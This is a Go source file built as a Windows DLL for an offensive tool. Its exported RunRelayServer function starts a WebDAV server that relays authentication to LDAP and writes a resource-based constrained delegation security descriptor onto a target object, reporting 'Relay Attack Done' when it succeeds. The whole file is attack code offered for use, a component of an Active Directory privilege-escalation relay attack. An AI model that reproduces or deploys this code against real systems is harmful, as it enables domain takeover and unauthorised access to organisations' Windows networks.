// Compile with:
// go build --buildmode=c-shared -ldflags="-s -w"  -o "GoRelayServer.dll" main.go
package main

import (
	"C"
	webdav_server "GoRelayServer/lib/webdav-server"
	"encoding/base64"
	"fmt"
	"strings"
)

func main() {
}

//RunRelayServer :
//export RunRelayServer
func RunRelayServer(port int, ldapURL *C.char, targetDN *C.char, base64RBCDSecurityDescriptor *C.char) bool {
	fmt.Printf("[+] Starting Relay Server on Port %d\n", port)

	LdapURL := strings.Fields(C.GoString(ldapURL))[0]
	TargetDN := strings.Fields(C.GoString(targetDN))[0]
	Base64RBCDSecurityDescriptor := strings.Fields(C.GoString(base64RBCDSecurityDescriptor))[0]
	RBCDSecurityDescriptor, _ := base64.StdEncoding.DecodeString(Base64RBCDSecurityDescriptor)

	w := webdav_server.Config{}
	w.StopAfterSuccess = true
	w.LdapURL = LdapURL
	w.TargetDN = TargetDN
	w.RBCDSecurityDescriptor = RBCDSecurityDescriptor

	success := w.StartWebdavServer(port)
	if success {
		fmt.Println("[+] Relay Attack Done")
	}

	return success
}
